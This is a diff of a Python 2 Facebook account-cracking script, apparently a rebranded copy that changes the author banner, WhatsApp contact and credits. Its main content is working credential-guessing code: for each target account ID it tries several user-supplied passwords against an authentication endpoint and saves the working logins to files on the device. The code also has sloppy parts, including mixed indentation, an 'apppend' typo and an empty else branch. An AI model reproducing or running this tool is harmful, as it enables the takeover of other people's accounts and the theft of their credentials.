@@ -38,14 +38,14 @@ header = {
 os.system('git pull')
 os.system('clear')
 logo = """
-\033[1;97m █████  \033[1;91m██      \033[1;97m██ 
-\033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
-\033[1;92m███████ \033[1;92m██      \033[1;92m██ 
-\033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
-\033[1;97m██   ██ \033[1;91m███████ \033[1;97m██
+\033[1;97m███████  █████  ██   ██ ██████   █████  
+\033[1;97m   ███  ██   ██ ██   ██ ██   ██ ██   ██ 
+\033[1;92m  ███   ███████ ███████ ██████  ███████ 
+\033[1;97m ███    ██   ██ ██   ██ ██   ██ ██   ██ 
+\033[1;97m███████ ██   ██ ██   ██ ██   ██ ██   ██ 
 \033[1;91m-----------------------------------------------
-\033[1;97m➣ Author : Xtylo Ali Raza x Ayesha Ali
-\033[1;97m➣ Github : https://github.com/Xtylo-x-Ayesha
+\033[1;97m➣ Author : Zahra Zohaib
+\033[1;97m➣ Github : https://github.com/Zahra
 \033[1;97m➣ Fb Page: Jam Shahrukh Official
 \033[1;91m-----------------------------------------------"""
 
@@ -79,7 +79,7 @@ def reg():
         print ' \033[1;92mCopy the id and send to admin'
         print ' \033[1;92mYour id: ' + to
         raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923051200096')
+        os.system('xdg-open https://wa.me/+923053176060')
         reg()
 
 
@@ -92,7 +92,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923051200096')
+    os.system('xdg-open https://wa.me/+923053176060')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -306,7 +306,7 @@ def menu_s():
     if ms == '1':
         auto_crack()
     elif ms == '2':
-        os.system('python2 .shahrukh.py')
+        os.system('python2 .ok.py')
     elif ms == '3':
         v_tok()
     elif ms == '4':
@@ -378,11 +378,10 @@ def a_s():
         print 47 * '-'
         print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+      	pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
-      	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
+	pass4 = raw_input(' \033[1;92m[4]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -413,11 +412,10 @@ def a_s():
         print 47 * '-'
         print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+      	pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -448,11 +446,10 @@ def a_s():
         print 47 * '-'
         print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+      	pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
         try:
 	    idlist= raw_input('[+] File Name: ')
 	    for line in open(idlist ,'r').readlines():
@@ -473,7 +470,7 @@ def a_s():
     print ' \033[1;97mCrack Running\033[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\033[1;94mXtylo King Of Facebook\033[1;91m'
+    print '\t\033[1;94mZahra Queen Of Facebook\033[1;91m'
     print 47 * '-'
     
     def main(arg):
@@ -481,33 +478,31 @@ def a_s():
         (uid, name) = user.split('|')
         
         try:
-            pass1 = name.lower() + p1
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass1
+                print '\033[1;93m[CP] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + p2
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;93m[CP] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -516,13 +511,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;93m[CP] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -531,32 +526,18 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\033[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;93m[CP] ' + uid + ' | ' + pass4
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
-			else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
-                            q = json.loads(data)
-                            if 'loc' in q:
-                                print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
-                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass5 + '\n')
-                                ok.close()
-                                oks.append(uid + pass5)
-                            elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass5
-                                cp = open('HOP_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass5 + '\n')
-                                cp.close()
-                                cps.apppend(uid + pass5)
+			
         except:
             pass
         
